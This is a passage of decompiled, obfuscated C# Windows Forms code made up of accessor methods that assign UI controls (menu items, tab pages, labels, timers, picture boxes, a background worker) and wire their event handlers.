            box.CheckedChanged += handler;
        }
    }

    internal virtual PictureBox vmethod_248()
    {
        return this.pictureBox_1;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_249(PictureBox pictureBox_7)
    {
        MouseEventHandler handler = new MouseEventHandler(this.method_182);
        MouseEventHandler handler2 = new MouseEventHandler(this.method_183);
        MouseEventHandler handler3 = new MouseEventHandler(this.method_184);
        MouseEventHandler handler4 = new MouseEventHandler(this.method_185);
        PictureBox box = this.pictureBox_1;
        if (box != null)
        {
            box.MouseDown -= handler;
            box.MouseUp -= handler2;
            box.MouseMove -= handler3;
            box.MouseWheel -= handler4;
        }
        this.pictureBox_1 = pictureBox_7;
        box = this.pictureBox_1;
        if (box != null)
        {
            box.MouseDown += handler;
            box.MouseUp += handler2;
            box.MouseMove += handler3;
            box.MouseWheel += handler4;
        }
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_25(PictureBox pictureBox_7)
    {
        MouseEventHandler handler = new MouseEventHandler(this.method_111);
        MouseEventHandler handler2 = new MouseEventHandler(this.method_113);
        MouseEventHandler handler3 = new MouseEventHandler(this.method_114);
        MouseEventHandler handler4 = new MouseEventHandler(this.method_115);
        PictureBox box = this.pictureBox_0;
        if (box != null)
        {
            box.MouseDown -= handler;
            box.MouseUp -= handler2;
            box.MouseMove -= handler3;
            box.MouseWheel -= handler4;
        }
        this.pictureBox_0 = pictureBox_7;
        box = this.pictureBox_0;
        if (box != null)
        {
            box.MouseDown += handler;
            box.MouseUp += handler2;
            box.MouseMove += handler3;
            box.MouseWheel += handler4;
        }
    }

    internal virtual ComboBox vmethod_250()
    {
        return this.comboBox_2;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_251(ComboBox comboBox_9)
    {
        this.comboBox_2 = comboBox_9;
    }

    internal virtual TabPage vmethod_252()
    {
        return this.tabPage_4;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_253(TabPage tabPage_17)
    {
        this.tabPage_4 = tabPage_17;
    }

    internal virtual Label vmethod_254()
    {
        return this.label_13;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_255(Label label_30)
    {
        this.label_13 = label_30;
    }

    internal virtual Label vmethod_256()
    {
        return this.label_14;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_257(Label label_30)
    {
        this.label_14 = label_30;
    }

    internal virtual VisualButton vmethod_258()
    {
        return this.visualButton_1;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_259(VisualButton visualButton_24)
    {
        EventHandler handler = new EventHandler(this.method_82);
        VisualButton button = this.visualButton_1;
        if (button != null)
        {
            button.Click -= handler;
        }
        this.visualButton_1 = visualButton_24;
        button = this.visualButton_1;
        if (button != null)
        {
            button.Click += handler;
        }
    }

    internal virtual Label vmethod_26()
    {
        return this.label_0;
    }

    internal virtual Label vmethod_260()
    {
        return this.label_15;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_261(Label label_30)
    {
        this.label_15 = label_30;
    }

    internal virtual VisualButton vmethod_262()
    {
        return this.visualButton_2;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_263(VisualButton visualButton_24)
    {
        EventHandler handler = new EventHandler(this.method_83);
        VisualButton button = this.visualButton_2;
        if (button != null)
        {
            button.Click -= handler;
        }
        this.visualButton_2 = visualButton_24;
        button = this.visualButton_2;
        if (button != null)
        {
            button.Click += handler;
        }
    }

    internal virtual PictureBox vmethod_264()
    {
        return this.pictureBox_2;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_265(PictureBox pictureBox_7)
    {
        this.pictureBox_2 = pictureBox_7;
    }

    internal virtual ToolStripMenuItem vmethod_266()
    {
        return this.toolStripMenuItem_63;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_267(ToolStripMenuItem toolStripMenuItem_136)
    {
        EventHandler handler = new EventHandler(this.method_81);
        ToolStripMenuItem item = this.toolStripMenuItem_63;
        if (item != null)
        {
            item.Click -= handler;
        }
        this.toolStripMenuItem_63 = toolStripMenuItem_136;
        item = this.toolStripMenuItem_63;
        if (item != null)
        {
            item.Click += handler;
        }
    }

    internal virtual ComboBox vmethod_268()
    {
        return this.comboBox_3;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_269(ComboBox comboBox_9)
    {
        this.comboBox_3 = comboBox_9;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_27(Label label_30)
    {
        this.label_0 = label_30;
    }

    internal virtual TabPage vmethod_270()
    {
        return this.tabPage_5;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_271(TabPage tabPage_17)
    {
        this.tabPage_5 = tabPage_17;
    }

    internal virtual ToolStripMenuItem vmethod_272()
    {
        return this.toolStripMenuItem_64;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_273(ToolStripMenuItem toolStripMenuItem_136)
    {
        this.toolStripMenuItem_64 = toolStripMenuItem_136;
    }

    internal virtual ToolStripMenuItem vmethod_274()
    {
        return this.toolStripMenuItem_65;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_275(ToolStripMenuItem toolStripMenuItem_136)
    {
        EventHandler handler = new EventHandler(this.method_85);
        ToolStripMenuItem item = this.toolStripMenuItem_65;
        if (item != null)
        {
            item.Click -= handler;
        }
        this.toolStripMenuItem_65 = toolStripMenuItem_136;
        item = this.toolStripMenuItem_65;
        if (item != null)
        {
            item.Click += handler;
        }
    }

    internal virtual ToolStripSeparator vmethod_276()
    {
        return this.toolStripSeparator_13;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_277(ToolStripSeparator toolStripSeparator_39)
    {
        this.toolStripSeparator_13 = toolStripSeparator_39;
    }

    internal virtual ToolStripMenuItem vmethod_278()
    {
        return this.toolStripMenuItem_66;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_279(ToolStripMenuItem toolStripMenuItem_136)
    {
        EventHandler handler = new EventHandler(this.method_86);
        ToolStripMenuItem item = this.toolStripMenuItem_66;
        if (item != null)
        {
            item.Click -= handler;
        }
        this.toolStripMenuItem_66 = toolStripMenuItem_136;
        item = this.toolStripMenuItem_66;
        if (item != null)
        {
            item.Click += handler;
        }
    }

    internal virtual ToolStripMenuItem vmethod_28()
    {
        return this.toolStripMenuItem_6;
    }

    internal virtual RichTextBox vmethod_280()
    {
        return this.richTextBox_0;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_281(RichTextBox richTextBox_5)
    {
        this.richTextBox_0 = richTextBox_5;
    }

    internal virtual BackgroundWorker vmethod_282()
    {
        return this.backgroundWorker_0;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_283(BackgroundWorker backgroundWorker_4)
    {
        DoWorkEventHandler handler = new DoWorkEventHandler(this.method_89);
        ProgressChangedEventHandler handler2 = new ProgressChangedEventHandler(this.method_92);
        RunWorkerCompletedEventHandler handler3 = new RunWorkerCompletedEventHandler(this.method_93);
        BackgroundWorker worker = this.backgroundWorker_0;
        if (worker != null)
        {
            worker.DoWork -= handler;
            worker.ProgressChanged -= handler2;
            worker.RunWorkerCompleted -= handler3;
        }
        this.backgroundWorker_0 = backgroundWorker_4;
        worker = this.backgroundWorker_0;
        if (worker != null)
        {
            worker.DoWork += handler;
            worker.ProgressChanged += handler2;
            worker.RunWorkerCompleted += handler3;
        }
    }

    internal virtual TabPage vmethod_284()
    {
        return this.tabPage_6;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_285(TabPage tabPage_17)
    {
        this.tabPage_6 = tabPage_17;
    }

    internal virtual RichTextBox vmethod_286()
    {
        return this.richTextBox_1;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_287(RichTextBox richTextBox_5)
    {
        this.richTextBox_1 = richTextBox_5;
    }

    internal virtual Timer vmethod_288()
    {
        return this.timer_0;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_289(Timer timer_4)
    {
        EventHandler handler = new EventHandler(this.method_94);
        Timer timer = this.timer_0;
        if (timer != null)
        {
            timer.Tick -= handler;
        }
        this.timer_0 = timer_4;
        timer = this.timer_0;
        if (timer != null)
        {
            timer.Tick += handler;
        }
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_29(ToolStripMenuItem toolStripMenuItem_136)
    {
        this.toolStripMenuItem_6 = toolStripMenuItem_136;
    }

    internal virtual ZeroitAnidasoCircleProgress vmethod_290()
    {
        return this.zeroitAnidasoCircleProgress_1;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_291(ZeroitAnidasoCircleProgress zeroitAnidasoCircleProgress_8)
    {
        this.zeroitAnidasoCircleProgress_1 = zeroitAnidasoCircleProgress_8;
    }

    internal virtual CheckBox vmethod_292()
    {
        return this.checkBox_3;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_293(CheckBox checkBox_8)
    {
        EventHandler handler = new EventHandler(this.method_168);
        KeyEventHandler handler2 = new KeyEventHandler(this.method_177);
        CheckBox box = this.checkBox_3;
        if (box != null)
        {
            box.CheckedChanged -= handler;
            box.KeyDown -= handler2;
        }
        this.checkBox_3 = checkBox_8;
        box = this.checkBox_3;
        if (box != null)
        {
            box.CheckedChanged += handler;
            box.KeyDown += handler2;
        }
    }

    internal virtual ToolStripMenuItem vmethod_294()
    {
        return this.toolStripMenuItem_67;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_295(ToolStripMenuItem toolStripMenuItem_136)
    {
        EventHandler handler = new EventHandler(this.method_43);
        ToolStripMenuItem item = this.toolStripMenuItem_67;
        if (item != null)
        {
            item.Click -= handler;
        }
        this.toolStripMenuItem_67 = toolStripMenuItem_136;
        item = this.toolStripMenuItem_67;
        if (item != null)
        {
            item.Click += handler;
        }
    }

    internal virtual ToolStripMenuItem vmethod_296()
    {
        return this.toolStripMenuItem_68;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_297(ToolStripMenuItem toolStripMenuItem_136)
    {
        EventHandler handler = new EventHandler(this.method_44);
        ToolStripMenuItem item = this.toolStripMenuItem_68;
        if (item != null)
        {
            item.Click -= handler;
        }
        this.toolStripMenuItem_68 = toolStripMenuItem_136;
        item = this.toolStripMenuItem_68;
        if (item != null)
        {
            item.Click += handler;
        }
    }

    internal virtual ToolStripMenuItem vmethod_298()
    {
        return this.toolStripMenuItem_69;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_299(ToolStripMenuItem toolStripMenuItem_136)
    {
        EventHandler handler = new EventHandler(this.method_103);
        ToolStripMenuItem item = this.toolStripMenuItem_69;
        if (item != null)
        {
            item.Click -= handler;
        }
        this.toolStripMenuItem_69 = toolStripMenuItem_136;
        item = this.toolStripMenuItem_69;
        if (item != null)
        {
            item.Click += handler;
        }
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_3(ToolStripMenuItem toolStripMenuItem_136)
    {
        this.toolStripMenuItem_0 = toolStripMenuItem_136;
    }

    internal virtual ToolStripMenuItem vmethod_30()
    {
        return this.toolStripMenuItem_7;
    }

    internal virtual TabPage vmethod_300()
    {
        return this.tabPage_7;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_301(TabPage tabPage_17)
    {
        this.tabPage_7 = tabPage_17;
    }

    internal virtual Label vmethod_302()
    {
        return this.label_16;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_303(Label label_30)
    {
        this.label_16 = label_30;
    }

    internal virtual ComboBox vmethod_304()
    {
        return this.comboBox_4;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_305(ComboBox comboBox_9)
    {
        this.comboBox_4 = comboBox_9;
    }

    internal virtual Label vmethod_306()
    {
        return this.label_17;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_307(Label label_30)
    {
        this.label_17 = label_30;
    }

    internal virtual StatusStrip vmethod_308()
    {
        return this.statusStrip_1;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_309(StatusStrip statusStrip_11)
    {
        this.statusStrip_1 = statusStrip_11;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_31(ToolStripMenuItem toolStripMenuItem_136)
    {
        EventHandler handler = new EventHandler(this.method_28);
        ToolStripMenuItem item = this.toolStripMenuItem_7;
        if (item != null)
        {
            item.Click -= handler;
        }
        this.toolStripMenuItem_7 = toolStripMenuItem_136;
        item = this.toolStripMenuItem_7;
        if (item != null)
        {
            item.Click += handler;
        }
    }

    internal virtual ToolStripStatusLabel vmethod_310()
    {
        return this.toolStripStatusLabel_5;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_311(ToolStripStatusLabel toolStripStatusLabel_40)
    {
        this.toolStripStatusLabel_5 = toolStripStatusLabel_40;
    }

    internal virtual ToolStripStatusLabel vmethod_312()
    {
        return this.toolStripStatusLabel_6;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_313(ToolStripStatusLabel toolStripStatusLabel_40)
    {
        this.toolStripStatusLabel_6 = toolStripStatusLabel_40;
    }

    internal virtual ToolStripStatusLabel vmethod_314()
    {
        return this.toolStripStatusLabel_7;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_315(ToolStripStatusLabel toolStripStatusLabel_40)
    {
        this.toolStripStatusLabel_7 = toolStripStatusLabel_40;
    }

    internal virtual GClass7 vmethod_316()
    {
        return this.gclass7_2;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_317(GClass7 gclass7_13)
    {
        MouseEventHandler handler = new MouseEventHandler(this.method_203);
        MouseEventHandler handler2 = new MouseEventHandler(this.method_296);
        GClass7 class2 = this.gclass7_2;
        if (class2 != null)
        {
            class2.MouseUp -= handler;
            class2.MouseDoubleClick -= handler2;
        }
        this.gclass7_2 = gclass7_13;
        class2 = this.gclass7_2;
        if (class2 != null)
        {
            class2.MouseUp += handler;
            class2.MouseDoubleClick += handler2;
        }
    }

    internal virtual Label vmethod_318()
    {
        return this.label_18;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_319(Label label_30)
    {
        this.label_18 = label_30;
    }

    internal virtual TabPage vmethod_32()
    {
        return this.tabPage_2;
    }

    internal virtual ComboBox vmethod_320()
    {
        return this.comboBox_5;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_321(ComboBox comboBox_9)
    {
        this.comboBox_5 = comboBox_9;
    }

    internal virtual Label vmethod_322()
    {
        return this.label_19;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_323(Label label_30)
    {
        this.label_19 = label_30;
    }

    internal virtual ToolStripMenuItem vmethod_324()
    {
        return this.toolStripMenuItem_70;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_325(ToolStripMenuItem toolStripMenuItem_136)
    {
        EventHandler handler = new EventHandler(this.method_104);
        ToolStripMenuItem item = this.toolStripMenuItem_70;
        if (item != null)
        {
            item.Click -= handler;
        }
        this.toolStripMenuItem_70 = toolStripMenuItem_136;
        item = this.toolStripMenuItem_70;
        if (item != null)
        {
            item.Click += handler;
        }
    }

    internal virtual ComboBox vmethod_326()
    {
        return this.comboBox_6;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_327(ComboBox comboBox_9)
    {
        this.comboBox_6 = comboBox_9;
    }

    internal virtual Label vmethod_328()
    {
        return this.label_20;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_329(Label label_30)
    {
        this.label_20 = label_30;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_33(TabPage tabPage_17)
    {
        this.tabPage_2 = tabPage_17;
    }

    internal virtual CheckBox vmethod_330()
    {
        return this.checkBox_4;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_331(CheckBox checkBox_8)
    {
        this.checkBox_4 = checkBox_8;
    }

    internal virtual ContextMenuStrip vmethod_332()
    {
        return this.contextMenuStrip_5;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_333(ContextMenuStrip contextMenuStrip_14)
    {
        this.contextMenuStrip_5 = contextMenuStrip_14;
    }

    internal virtual ToolStripMenuItem vmethod_334()
    {
        return this.toolStripMenuItem_71;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_335(ToolStripMenuItem toolStripMenuItem_136)
    {
        EventHandler handler = new EventHandler(this.method_107);
        ToolStripMenuItem item = this.toolStripMenuItem_71;
        if (item != null)
        {
            item.Click -= handler;
        }
        this.toolStripMenuItem_71 = toolStripMenuItem_136;
        item = this.toolStripMenuItem_71;
        if (item != null)
        {
            item.Click += handler;
        }
    }

    internal virtual ToolStripSeparator vmethod_336()
    {
        return this.toolStripSeparator_14;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_337(ToolStripSeparator toolStripSeparator_39)
    {
        this.toolStripSeparator_14 = toolStripSeparator_39;
    }

    internal virtual ToolStripMenuItem vmethod_338()
    {
        return this.toolStripMenuItem_72;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_339(ToolStripMenuItem toolStripMenuItem_136)
    {
        EventHandler handler = new EventHandler(this.method_105);
        ToolStripMenuItem item = this.toolStripMenuItem_72;
        if (item != null)
        {
            item.Click -= handler;
        }
        this.toolStripMenuItem_72 = toolStripMenuItem_136;
        item = this.toolStripMenuItem_72;
        if (item != null)
        {
            item.Click += handler;
        }
    }

    internal virtual ContextMenuStrip vmethod_34()
    {
        return this.contextMenuStrip_1;
    }

    internal virtual SaveFileDialog vmethod_340()
    {
        return this.saveFileDialog_0;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_341(SaveFileDialog saveFileDialog_1)
    {
        this.saveFileDialog_0 = saveFileDialog_1;
    }

    internal virtual Timer vmethod_342()
    {
        return this.timer_1;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_343(Timer timer_4)
    {
        EventHandler handler = new EventHandler(this.method_109);
        Timer timer = this.timer_1;
        if (timer != null)
        {
            timer.Tick -= handler;
        }
        this.timer_1 = timer_4;
        timer = this.timer_1;
        if (timer != null)
        {
            timer.Tick += handler;
        }
    }

    internal virtual ToolStripMenuItem vmethod_344()
    {
        return this.toolStripMenuItem_73;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_345(ToolStripMenuItem toolStripMenuItem_136)
    {
        EventHandler handler = new EventHandler(this.method_106);
        ToolStripMenuItem item = this.toolStripMenuItem_73;
        if (item != null)
        {
            item.Click -= handler;
        }
        this.toolStripMenuItem_73 = toolStripMenuItem_136;
        item = this.toolStripMenuItem_73;
        if (item != null)
        {
            item.Click += handler;
        }
    }

    internal virtual ToolStripSeparator vmethod_346()
    {
        return this.toolStripSeparator_15;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_347(ToolStripSeparator toolStripSeparator_39)
    {
        this.toolStripSeparator_15 = toolStripSeparator_39;
    }

    internal virtual ToolStripMenuItem vmethod_348()
    {
        return this.toolStripMenuItem_74;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_349(ToolStripMenuItem toolStripMenuItem_136)
    {
        EventHandler handler = new EventHandler(this.method_112);
        ToolStripMenuItem item = this.toolStripMenuItem_74;
        if (item != null)
        {
            item.Click -= handler;
        }
        this.toolStripMenuItem_74 = toolStripMenuItem_136;
        item = this.toolStripMenuItem_74;
        if (item != null)
        {
            item.Click += handler;
        }
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_35(ContextMenuStrip contextMenuStrip_14)
    {
        this.contextMenuStrip_1 = contextMenuStrip_14;
    }

    internal virtual TabPage vmethod_350()
    {
        return this.tabPage_8;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_351(TabPage tabPage_17)
    {
        this.tabPage_8 = tabPage_17;
    }

    internal virtual RichTextBox vmethod_352()
    {
        return this.richTextBox_2;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_353(RichTextBox richTextBox_5)
    {
        this.richTextBox_2 = richTextBox_5;
    }

    internal virtual ToolStripMenuItem vmethod_354()
    {
        return this.toolStripMenuItem_75;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_355(ToolStripMenuItem toolStripMenuItem_136)
    {
        this.toolStripMenuItem_75 = toolStripMenuItem_136;
    }

    internal virtual ToolStripMenuItem vmethod_356()
    {
        return this.toolStripMenuItem_76;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_357(ToolStripMenuItem toolStripMenuItem_136)
    {
        EventHandler handler = new EventHandler(this.method_117);
        ToolStripMenuItem item = this.toolStripMenuItem_76;
        if (item != null)
        {
            item.Click -= handler;
        }
        this.toolStripMenuItem_76 = toolStripMenuItem_136;
        item = this.toolStripMenuItem_76;
        if (item != null)
        {
            item.Click += handler;
        }
    }

    internal virtual TabPage vmethod_358()
    {
        return this.tabPage_9;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_359(TabPage tabPage_17)
    {
        this.tabPage_9 = tabPage_17;
    }

    internal virtual ToolStripMenuItem vmethod_36()
    {
        return this.toolStripMenuItem_8;
    }

    internal virtual ContextMenuStrip vmethod_360()
    {
        return this.contextMenuStrip_6;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_361(ContextMenuStrip contextMenuStrip_14)
    {
        this.contextMenuStrip_6 = contextMenuStrip_14;
    }

    internal virtual ToolStripMenuItem vmethod_362()
    {
        return this.toolStripMenuItem_77;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_363(ToolStripMenuItem toolStripMenuItem_136)
    {
        EventHandler handler = new EventHandler(this.method_118);
        ToolStripMenuItem item = this.toolStripMenuItem_77;
        if (item != null)
        {
            item.Click -= handler;
        }
        this.toolStripMenuItem_77 = toolStripMenuItem_136;
        item = this.toolStripMenuItem_77;
        if (item != null)
        {
            item.Click += handler;
        }
    }

    internal virtual ZeroitAnidasoCircleProgress vmethod_364()
    {
        return this.zeroitAnidasoCircleProgress_2;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_365(ZeroitAnidasoCircleProgress zeroitAnidasoCircleProgress_8)
    {
        this.zeroitAnidasoCircleProgress_2 = zeroitAnidasoCircleProgress_8;
    }

    internal virtual ToolStripSeparator vmethod_366()
    {
        return this.toolStripSeparator_16;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_367(ToolStripSeparator toolStripSeparator_39)
    {
        this.toolStripSeparator_16 = toolStripSeparator_39;
    }

    internal virtual ToolStripMenuItem vmethod_368()
    {
        return this.toolStripMenuItem_78;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_369(ToolStripMenuItem toolStripMenuItem_136)
    {
        EventHandler handler = new EventHandler(this.method_119);
        ToolStripMenuItem item = this.toolStripMenuItem_78;
        if (item != null)
        {
            item.Click -= handler;
        }
        this.toolStripMenuItem_78 = toolStripMenuItem_136;
        item = this.toolStripMenuItem_78;
        if (item != null)
        {
            item.Click += handler;
        }
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_37(ToolStripMenuItem toolStripMenuItem_136)
    {
        EventHandler handler = new EventHandler(this.method_29);
        ToolStripMenuItem item = this.toolStripMenuItem_8;
        if (item != null)
        {
            item.Click -= handler;
        }
        this.toolStripMenuItem_8 = toolStripMenuItem_136;
        item = this.toolStripMenuItem_8;
        if (item != null)
        {
            item.Click += handler;
        }
    }

    internal virtual ToolStripMenuItem vmethod_370()
    {
        return this.toolStripMenuItem_79;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_371(ToolStripMenuItem toolStripMenuItem_136)
    {
        this.toolStripMenuItem_79 = toolStripMenuItem_136;
    }

    internal virtual ToolStripMenuItem vmethod_372()
    {
        return this.toolStripMenuItem_80;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_373(ToolStripMenuItem toolStripMenuItem_136)
    {
        EventHandler handler = new EventHandler(this.method_123);
        ToolStripMenuItem item = this.toolStripMenuItem_80;
        if (item != null)
        {
            item.Click -= handler;
        }
        this.toolStripMenuItem_80 = toolStripMenuItem_136;
        item = this.toolStripMenuItem_80;
        if (item != null)
        {
            item.Click += handler;
        }
    }

    internal virtual ToolStripMenuItem vmethod_374()
    {
        return this.toolStripMenuItem_81;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_375(ToolStripMenuItem toolStripMenuItem_136)
    {
        EventHandler handler = new EventHandler(this.method_122);
        ToolStripMenuItem item = this.toolStripMenuItem_81;
        if (item != null)
        {
            item.Click -= handler;
        }
        this.toolStripMenuItem_81 = toolStripMenuItem_136;
        item = this.toolStripMenuItem_81;
        if (item != null)
        {
            item.Click += handler;
        }
    }

    internal virtual ToolStripSeparator vmethod_376()
    {
        return this.toolStripSeparator_17;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_377(ToolStripSeparator toolStripSeparator_39)
    {
        this.toolStripSeparator_17 = toolStripSeparator_39;
    }

    internal virtual ToolStripMenuItem vmethod_378()
    {
        return this.toolStripMenuItem_82;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_379(ToolStripMenuItem toolStripMenuItem_136)
    {
        EventHandler handler = new EventHandler(this.method_124);
        ToolStripMenuItem item = this.toolStripMenuItem_82;
        if (item != null)
        {
            item.Click -= handler;
        }
        this.toolStripMenuItem_82 = toolStripMenuItem_136;
        item = this.toolStripMenuItem_82;
        if (item != null)
        {
            item.Click += handler;
        }
    }

    internal virtual ToolStripSeparator vmethod_38()
    {
        return this.toolStripSeparator_1;
    }

    internal virtual ToolStripMenuItem vmethod_380()
    {
        return this.toolStripMenuItem_83;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_381(ToolStripMenuItem toolStripMenuItem_136)
    {
        this.toolStripMenuItem_83 = toolStripMenuItem_136;
    }

    internal virtual ToolStripMenuItem vmethod_382()
    {
        return this.toolStripMenuItem_84;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_383(ToolStripMenuItem toolStripMenuItem_136)
    {
        EventHandler handler = new EventHandler(this.method_129);
        ToolStripMenuItem item = this.toolStripMenuItem_84;
        if (item != null)
        {
            item.Click -= handler;
        }
        this.toolStripMenuItem_84 = toolStripMenuItem_136;
        item = this.toolStripMenuItem_84;
        if (item != null)
        {
            item.Click += handler;
        }
    }

    internal virtual ToolStripMenuItem vmethod_384()
    {
        return this.toolStripMenuItem_85;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_385(ToolStripMenuItem toolStripMenuItem_136)
    {
        EventHandler handler = new EventHandler(this.method_130);
        ToolStripMenuItem item = this.toolStripMenuItem_85;
        if (item != null)
        {
            item.Click -= handler;
        }
        this.toolStripMenuItem_85 = toolStripMenuItem_136;
        item = this.toolStripMenuItem_85;
        if (item != null)
        {
            item.Click += handler;
        }
    }

    internal virtual Label vmethod_386()
    {
        return this.label_21;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_387(Label label_30)
    {
        this.label_21 = label_30;
    }

    internal virtual GClass7 vmethod_388()
    {
        return this.gclass7_3;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_389(GClass7 gclass7_13)
    {
        MouseEventHandler handler = new MouseEventHandler(this.method_143);
        KeyEventHandler handler2 = new KeyEventHandler(this.method_151);
        EventHandler handler3 = new EventHandler(this.method_152);
        ColumnClickEventHandler handler4 = new ColumnClickEventHandler(this.method_195);
        GClass7 class2 = this.gclass7_3;
        if (class2 != null)
        {
            class2.MouseUp -= handler;
            class2.KeyDown -= handler2;
            class2.DoubleClick -= handler3;
            class2.ColumnClick -= handler4;
        }
        this.gclass7_3 = gclass7_13;
        class2 = this.gclass7_3;
        if (class2 != null)
        {
            class2.MouseUp += handler;
            class2.KeyDown += handler2;
            class2.DoubleClick += handler3;
            class2.ColumnClick += handler4;
        }
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_39(ToolStripSeparator toolStripSeparator_39)
    {
        this.toolStripSeparator_1 = toolStripSeparator_39;
    }

    internal virtual ContextMenuStrip vmethod_390()
    {
        return this.contextMenuStrip_7;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_391(ContextMenuStrip contextMenuStrip_14)
    {
        this.contextMenuStrip_7 = contextMenuStrip_14;
    }

    internal virtual ToolStripMenuItem vmethod_392()
    {
        return this.toolStripMenuItem_86;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_393(ToolStripMenuItem toolStripMenuItem_136)
    {
        EventHandler handler = new EventHandler(this.method_131);
